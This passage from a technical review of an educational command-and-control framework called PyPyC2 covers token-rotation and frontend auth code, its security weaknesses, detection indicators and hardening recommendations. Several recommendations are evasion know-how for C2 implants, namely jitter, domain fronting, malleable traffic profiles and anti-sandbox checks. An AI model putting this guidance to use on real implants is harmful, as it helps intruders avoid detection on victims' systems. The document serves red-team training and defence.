from datetime import datetime, timedelta, timezone

class PayloadTokenManager:
    def __init__(self, rotation_interval: int = 300):  # 5 minutes
        self.rotation_interval = rotation_interval
        self.current_token = self._generate_token()
        self.token_expiry = datetime.now(timezone.utc) + timedelta(seconds=rotation_interval)
        self.lock = threading.Lock()

        # Start background rotation thread
        self.rotation_thread = threading.Thread(target=self._rotation_loop, daemon=True)
        self.rotation_thread.start()

    def _generate_token(self) -> str:
        return secrets.token_urlsafe(16)  # 128-bit token

    def _rotation_loop(self):
        while True:
            time.sleep(self.rotation_interval)
            with self.lock:
                self.current_token = self._generate_token()
                self.token_expiry = datetime.now(timezone.utc) + timedelta(seconds=self.rotation_interval)

    def get_current_token(self) -> tuple[str, int]:
        with self.lock:
            expires_in = int((self.token_expiry - datetime.now(timezone.utc)).total_seconds())
            return self.current_token, expires_in

    def validate_token(self, token: str) -> bool:
        with self.lock:
            return token == self.current_token
```

---

### Frontend Architecture

**React Context** (`frontend/src/contexts/AuthContext.tsx`):
```typescript
const AuthContext = createContext<AuthContextType | undefined>(undefined)

export function AuthProvider({ children }: { children: React.ReactNode }) {
  const [token, setToken] = useState<string | null>(null)
  const [username, setUsername] = useState<string | null>(null)

  // Load from localStorage on mount
  useEffect(() => {
    const savedToken = localStorage.getItem('token')
    const savedUsername = localStorage.getItem('username')
    if (savedToken && savedUsername) {
      setToken(savedToken)
      setUsername(savedUsername)
    }
  }, [])

  const login = (token: string, username: string) => {
    setToken(token)
    setUsername(username)
    localStorage.setItem('token', token)
    localStorage.setItem('username', username)
  }

  const logout = () => {
    setToken(null)
    setUsername(null)
    localStorage.removeItem('token')
    localStorage.removeItem('username')
  }

  return (
    <AuthContext.Provider value={{ token, username, login, logout }}>
      {children}
    </AuthContext.Provider>
  )
}
```

**API Client** (`frontend/src/lib/api.ts`):
```typescript
async function apiCall<T>(endpoint: string, options: RequestInit = {}): Promise<T> {
  const token = localStorage.getItem('token')

  const response = await fetch(`${API_URL}${endpoint}`, {
    ...options,
    headers: {
      'Content-Type': 'application/json',
      ...(token && { 'Authorization': `Bearer ${token}` }),
      ...options.headers,
    },
  })

  if (response.status === 401) {
    localStorage.removeItem('token')
    window.location.href = '/login'
    throw new Error('Unauthorized')
  }

  if (!response.ok) {
    const error = await response.json()
    throw new Error(error.detail || 'Request failed')
  }

  return response.json()
}
```

---

## Security Analysis

### Authentication & Authorization

#### Strengths
✅ **Password Hashing**: Uses bcrypt (industry standard)
✅ **Session Timeout**: 8-hour expiry prevents infinite sessions
✅ **Bearer Tokens**: Standard authorization pattern
✅ **Token Validation**: Checked on every protected request

#### Weaknesses
❌ **Hardcoded Credentials**: Password in source code
❌ **No Password Change**: Cannot update admin password
❌ **No Multi-User**: Only one admin account
❌ **No Role-Based Access**: All authenticated users have full access
❌ **Predictable Tokens**: UUID v4 (good but not as secure as signed JWTs)

---

### Network Security

#### Critical Gaps
❌ **No TLS/HTTPS**: ALL traffic is **plaintext HTTP**
- Admin credentials transmitted unencrypted
- Bearer tokens visible on network
- All commands and results visible
- File contents exposed
- **MITM attacks trivial**

❌ **No Agent Authentication**:
- Any client can join as agent
- No way to verify agents are legitimate
- Rogue agents could poison C2

❌ **No Command Signing**:
- Agents blindly trust commands from server
- MITM could inject malicious commands

❌ **CORS Wide Open** (`allow_origins=["*"]`):
- Any website can make requests
- XSS on any site could access C2 API

---

### Payload Protection

#### Token Rotation System

**How it works**:
1. Background thread generates new token every 5 minutes
2. Launcher endpoint validates token before serving
3. Old URLs become invalid after rotation

**Effectiveness**:
✅ Prevents static URL sharing
✅ Limits automated scraping
⚠️ **But**: 5-minute window is still exploitable
❌ Agent download endpoint (`/payload/allinone.py`) has **NO protection**

---

### Input Validation

#### File Operations
✅ **Path Traversal Prevention**: `Path(filename).name` sanitizes
✅ **Size Limits**: 100MB prevents resource exhaustion
✅ **Agent Isolation**: Separate directories per agent

❌ **No File Type Restrictions**: Could upload executables, scripts
❌ **No Malware Scanning**: Uploaded files not checked
❌ **No Access Control**: Agents can't access each other's files (good) but no verification

#### Command Execution
❌ **No Sanitization**: Commands passed directly to PowerShell
❌ **Full Shell Access**: Agent has all privileges of user context
❌ **No Command Whitelisting**: Any command can be executed

---

### Data Persistence

#### In-Memory Storage
✅ **Fast**: No database overhead
✅ **Simple**: No complex queries or schemas

❌ **Volatile**: Agents lost on server restart
❌ **No Audit Trail**: No logs of past agents or commands
❌ **No Backup**: Data cannot be recovered
❌ **Session Loss**: All users logged out on restart

**Recommendation**: Add optional SQLite/PostgreSQL for persistence

---

### Agent Detection Risk

#### Indicators of Compromise (IOCs)

**Network**:
- Predictable polling interval (no jitter)
- HTTP traffic (not HTTPS)
- Regular GET requests to `/agent/get_commands/{id}`
- JSON-formatted C2 traffic

**Host**:
- PowerShell spawning Python
- Python process with network connections
- In-memory execution (harder to detect)
- No persistence mechanism (won't survive reboot)

**Behavioral**:
- Regular outbound HTTP requests
- Python installed silently (via launcher)
- PowerShell downloading and executing remote code

---

### Recommendations

#### High Priority
1. **Add TLS/HTTPS**: Encrypt all traffic
2. **Agent Authentication**: Require pre-shared keys or certificates
3. **Command Signing**: Use HMAC or digital signatures
4. **Change Default Password**: Force password change on first login
5. **Add Jitter**: Randomize polling intervals (e.g., 3-7s instead of exactly 5s)

#### Medium Priority
6. **Add Persistence**: Optional database backend
7. **Audit Logging**: Log all commands, logins, file operations
8. **Rate Limiting**: Prevent brute force attacks
9. **Multi-User Support**: Multiple operators with different roles
10. **IP Whitelisting**: Only allow agents from expected ranges

#### Low Priority
11. **Encrypted C2 Traffic**: Custom encryption layer (beyond TLS)
12. **Domain Fronting**: Hide C2 behind CDN
13. **Malleable Profiles**: Customize traffic patterns
14. **Anti-VM Detection**: Check for sandboxes before running

---

## Conclusion

PyPyC2 is a **well-architected educational C2 framework** demonstrating:
- Modern web technologies (FastAPI, React, TypeScript)
- Clean code structure and separation of concerns
- Rich feature set (9 command types, file manager, terminal)
- Polished user interface with auto-refresh

**Best suited for**:
✅ Red team training
✅ Security research
✅ Understanding C2 mechanics
✅ Learning FastAPI and React

**Not suitable for**:
❌ Production operations (no encryption)
❌ Long-term campaigns (no persistence)
❌ Multi-operator teams (single user)
❌ Evasion-focused ops (detectable patterns)

**Educational Value**: Excellent for understanding how modern C2s work, but needs significant hardening for real-world use.
